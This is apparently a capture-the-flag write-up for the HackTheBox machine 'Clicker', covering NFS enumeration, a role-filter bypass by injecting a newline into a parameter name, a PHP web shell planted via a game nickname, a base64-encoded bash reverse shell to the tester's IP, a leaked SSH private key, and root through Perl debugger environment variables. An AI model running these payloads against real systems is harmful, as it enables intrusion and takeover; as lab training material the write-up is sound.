# RECON:

### First scan with nmap:

nmap 10.10.11.232

PORT STATE SERVICE

22/tcp open ssh
80/tcp open http
111/tcp open rpcbind
2049/tcp open nfs

### Second scan with nmap:


sudo nmap -sVC -p 22,80,111,2049 

```
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_ 256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp open http Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to [http://clicker.htb/](http://clicker.htb/)
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 38503/tcp6 mountd
| 100005 1,2,3 39057/tcp mountd
| 100005 1,2,3 47467/udp6 mountd
| 100005 1,2,3 60148/udp mountd
| 100021 1,3,4 34289/tcp6 nlockmgr
| 100021 1,3,4 36587/tcp nlockmgr
| 100021 1,3,4 39312/udp nlockmgr
| 100021 1,3,4 48252/udp6 nlockmgr
| 100024 1 34717/tcp status
| 100024 1 42101/tcp6 status
| 100024 1 52362/udp6 status
| 100024 1 60786/udp status
| 100227 3 2049/tcp nfs_acl
|_ 100227 3 2049/tcp6 nfs_acl
2049/tcp open nfs_acl 3 (RPC #100227)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## What is 111 port ?

`PORT 111 is the SUN Remote Procedure Call. This port is used as a well-defined means for` **`determining the ports upon which other services in the system are running`**`. It is referred to as a "portmapper" because it provides a directory, or "mapping" between available services and their ports.`

• For portmapper services, NFSv3 and NFSv2 use TCP or UDP port 111. The portmapper service is consulted to get the port numbers for services used with NFSv3 or NFSv2 protocols such as mountd, statd, and nlm etc. NFSv4 does not require the portmapper service.


### Helpfull command :
This input command will retrieve you all of this info:
`rpcinfo -p 10.10.11.232`


Output
```
program vers proto port service
100000 4 tcp 111 portmapper
100000 3 tcp 111 portmapper
100000 2 tcp 111 portmapper
100000 4 udp 111 portmapper
100000 3 udp 111 portmapper
100000 2 udp 111 portmapper
100005 1 udp 48737 mountd
100005 1 tcp 46055 mountd
100005 2 udp 59554 mountd
100005 2 tcp 46023 mountd
100005 3 udp 55703 mountd
100005 3 tcp 58049 mountd
100024 1 udp 46387 status
100024 1 tcp 44097 status
100003 3 tcp 2049 nfs
100003 4 tcp 2049 nfs
100227 3 tcp 2049 nfs_acl
100021 1 udp 39483 nlockmgr
100021 3 udp 39483 nlockmgr
100021 4 udp 39483 nlockmgr
100021 1 tcp 33093 nlockmgr
100021 3 tcp 33093 nlockmgr
100021 4 tcp 33093 nlockmgr
```

What is NFS port 2049?
**`Network File System`** `(NFS) is used by UNIX clients for file access. NFS uses port 2049. NFSv3 and NFSv2 use the portmapper service on TCP or UDP port 111. The portmapper service is consulted to get the port numbers for services used with NFSv3 or NFSv2 protocols such as mountd, statd, and nlm.`

### LAUNCHPAD:

OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 = ubuntu jammy jelfish 2023-07-24
Apache httpd 2.4.52 = seems to be jammy


WAPPALIZER:

[Programming languages](https://www.wappalyzer.com/technologies/programming-languages/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)

[](https://www.wappalyzer.com/technologies/programming-languages/php/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)[PHP](https://www.wappalyzer.com/technologies/programming-languages/php/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)

[UI frameworks](https://www.wappalyzer.com/technologies/ui-frameworks/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)

[](https://www.wappalyzer.com/technologies/ui-frameworks/bootstrap/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)[Bootstrap](https://www.wappalyzer.com/technologies/ui-frameworks/bootstrap/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)


### GOBUSTER

DIRECTORIES:
```
/.hta.php (Status: 403) [Size: 276]
/.hta.txt (Status: 403) [Size: 276]
/.hta (Status: 403) [Size: 276]
/.php (Status: 403) [Size: 276]
/exports (Status: 301) [Size: 312] [--> [http://clicker.htb/exports/]](http://clicker.htb/exports/])
/export.php (Status: 302) [Size: 0] [--> /index.php]
/index.php (Status: 200) [Size: 2984]
/index.php (Status: 200) [Size: 2984]
/info.php (Status: 200) [Size: 3343]
/info.php (Status: 200) [Size: 3343]
/login.php (Status: 200) [Size: 3221]
/logout.php (Status: 302) [Size: 0] [--> /index.php]
/play.php (Status: 302) [Size: 0] [--> /index.php]
/profile.php (Status: 302) [Size: 0] [--> /index.php]
/register.php (Status: 200) [Size: 3253]
/server-status (Status: 403) [Size: 276]
Progress: 18456 / 18460 (99.98%)
```


The port 2049 is open, and  I searched if I had some interesting data.

This command `showmount -e 10.10.11.232`
retrieves me the output of the available files on that port
```
Export list for 10.10.11.232:

/mnt/backups *
```

Now I did the next operation to mount it on my machine and copy the information of the `backups`file

```
kali > sudo mkdir /mnt/mydrive
kali > sudo mount 10.10.11.232:/mnt/backups/ /mnt/mydrive
```

This folder inside has a file named `clicker.htb_backup.zip` with the source code of the site http://clicker.htb  (add it on the /etc/host to see it first ) 


This website is a online game. You must click and you will lvl up. Inside of the source code that I see on the `clicker.htb_backup.zip` I was able t o see that there is an "admin" functionality. So I tried to become administrator.


# FOOTHOLD:

### Method to be admin:

I was able to see on the website that there is a functionality where I save the game. Intercepting it with burpsuit I was able to see a "get" petition

`GET /save_game.php?clicks=0&level=0 HTTP/1.1`

On the source code exists a functionality that explains how the website interacts with the database, that seems to be mysql.

```
function create_new_player($player, $password) {
        global $pdo;
        $params = ["player"=>$player, "password"=>hash("sha256", $password)];
        $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
        $stmt->execute($params);
}

```

So if I modify the param 'Admin' when I save the game maybe I will be able to become admin. But I have to bypass a filter first

```
if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
        $args = [];
        foreach($_GET as $key=>$value) {
                if (strtolower($key) === 'role') {
                        // prevent malicious users to modify role
                        header('Location: /index.php?err=Malicious activity detected!');
```


I was able to bypass it with `CRLF` Injection, that is this:

CRLF injections are **vulnerabilities where the attacker is able to inject CR (carriage return, ASCII 13) and LF (line feed, ASCII 10) characters into the web application**. This lets the attacker add extra headers to HTTP responses or even make the browser ignore the original content and process injected content instead.

This was the payload that I used to become admin, I changed my password too. And I must get out of my account and re-login to see the changes. Otherwise changing only the param `role` this does not worked for me.

```
GET /save_game.php?clicks=0&level=0&username=test&password=5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8&nickname=test0&role%0a=Admin
```

At this point the new password that I inserted was "password".

Now, that I'm admin I can use this functionalities

```
// ONLY FOR THE ADMIN
function get_top_players($number) {
        global $pdo;
        $stmt = $pdo->query("SELECT nickname,clicks,level FROM players WHERE clicks >= " . $number);
        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        return $result;
}
function get_current_player($player) {
    global $pdo;
    $stmt = $pdo->prepare("SELECT nickname, clicks, level FROM players WHERE username = :player");
    $stmt->bindParam(':player', $player, PDO::PARAM_STR);
    $stmt->execute();
    if ($stmt->rowCount() > 0) {
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    } else {
        return null; 
    }
}
```

This makes me see the top users. And I have the option to use 3 extensions html,txt and json. Then when I go to the route `http://clicker.htb/exports/file.txt` I'm able to see it.


The vulnerability at this point is, this code do not filter another extensions and I'am able to create a file with php extension. If I'am able to create a user with the nickname of a php command the website will interpret it as a code. We cant create a user with special characters, the website does not permits us to do it. But we can inject a nickname when we save the game.

First I save the game with a malicious nickname
```
GET /save_game.php?clicks=0&level=0&nickname=<%3fphp+system($_GET['cmd'])+%3f>
```

Then I intercept the petition to create a txt, html or json file and I put my php extension

```
POST /export.php HTTP/1.1
Host: clicker.htb
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://clicker.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://clicker.htb/admin.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=8n7d13shlijhoesamnsvtp6ajb
Connection: close

threshold=1&extension=php
```

This was the response

```
GET /admin.php?msg=Data%20has%20been%20saved%20in%20exports/top_players_8o3cjv79.php HTTP/1.1
```


Now I inserted a reverse shell on the petition, encoded with base64

```
GET /exports/top_players_8o3cjv79.php?cmd=echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODYvNDQ0NCAwPiYxCg==%22%20|%20base64%20-d%20|%20bash
```

### Explanation of the reverse shell:

First on my terminal
`echo "sh -i >& /dev/tcp/<your_ip>/4444 0>&1" | base64`

This was the output
`c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ3LzkwMDEgMD4mMQo=`

Now on the browser

```
http://clicker.htb/exports/top_players_8o3cjv79.php?cmd=echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODYvNDQ0NCAwPiYxCg==%22%20|%20base64%20-d%20|%20bash
```


Of course first I was listening with netcat on my terminal

`nc -nlvp 4444`


Now I use this to have a better tty, because if I use ctrl+z I will lose my reverse shell.
```
script /dev/null -c bash

ctrl +z
stty raw echo ;fg

export TERM=xterm
```

# USER:

Lets see the available users:

`cat /etc/passwd | grep sh`

This user exists , and is able to use a bash

`jack:x:1000:1000:jack:/home/jack:/bin/bash`

I found some interesting binaries with `find /`

```
find / -perm /4000 2>/dev/null

/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
```


This was interesting:

`/opt/manage/execute_query`

This has a README.TXT with this info:

```
Use the binary to execute the following task:
- 1: Creates the database structure and adds user admin
- 2: Creates fake players (better not tell anyone)
- 3: Resets the admin password
- 4: Deletes all users except the admin
```

I found a hash when I reset the admin password 

`./execute_query 3`

The output:

```
UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
```


Possible hashes (I wasn't able to crack it):

```
1400 | SHA2-256 | Raw Hash
17400 | SHA3-256 | Raw Hash
11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash
6900 | GOST R 34.11-94 | Raw Hash
17800 | Keccak-256 | Raw Hash
1470 | sha256(utf16le($pass)) | Raw Hash
20800 | sha256(md5($pass)) | Raw Hash salted and/or iterated
21400 | sha256(sha256_bin($pass)) | Raw Hash salted and/or iterated
```

The next step was search inside the binary with ghidra

When I uncompile the main function , I was able to see this:

```

if (param_1 < 2) {

puts("ERROR: not enough arguments");

uVar2 = 1;
}

else {

iVar1 = atoi(*(char **)(param_2 + 8));

pcVar3 = (char *)calloc(0x14,1);

switch(iVar1) {

case 0:

puts("ERROR: Invalid arguments");

uVar2 = 2;

goto LAB_001015e1;

case 1:

strncpy(pcVar3,"create.sql",0x14);

break;

case 2:

strncpy(pcVar3,"populate.sql",0x14);

break;

case 3:

strncpy(pcVar3,"reset_password.sql",0x14);

break;

case 4:

strncpy(pcVar3,"clean.sql",0x14);

break;

default:

strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
```

There is a 5 option on the binary

Input
`kali> ./execute_query 5`
output
`Segmentation fault (core dumped)`
Input
`kali> ./execute_query 5 ls`
Output
`File not readable or not found`

Looks like I can read files from the system and the owner of the binary is jack
`-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query`

Maybe I can read files from the jack's folders, some credentials, the port 22 is opened so maybe a id_rsa file exists on this machine. With prove and error I guess that the file is on the `/home/jack/documents` folder. So, to be able to see the credentials I most go to `../.ssh/id_rsa`

Input:
`./execute_query 5 ../.ssh/id_rsa`

Output:

```
-----BEGIN OPENSSH PRIVATE KEY---

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
-----END OPENSSH PRIVATE KEY---
```

I had some errors while I was trying to connect via ssh. Because on the end of private key and start it needs two more dashes (--) 

```
ssh -i id_rsa jack@10.10.11.232
```


# ROOT:


When I was the user jack. The first thing that I did was 
`sudo -l`

And I was able to use this binary: 

```
sudo /opt/monitor.sh
```
This is what is inside of this binary, looks like is using another binary 
/usr/bin/xml_pp
```
strings /opt/monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;
data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml

```

The method file gives me this:

```
kali> file /usr/bin/xml_pp
/usr/bin/xml_pp: Perl script text executable
```

The name of this vulnerability is called  “perl_startup” Privilege Escalation.

This consist on execute scripts with root privileges, as I had the ability to configure the environment while running Perl.


`sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh`

`bash -p`


And that's all !!



Assets for understand the priviledge scalation:

https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/

https://medium.com/@DGclasher/privilege-escalation-through-perl-environment-variables-349b39ca01

https://www.exploit-db.com/exploits/39702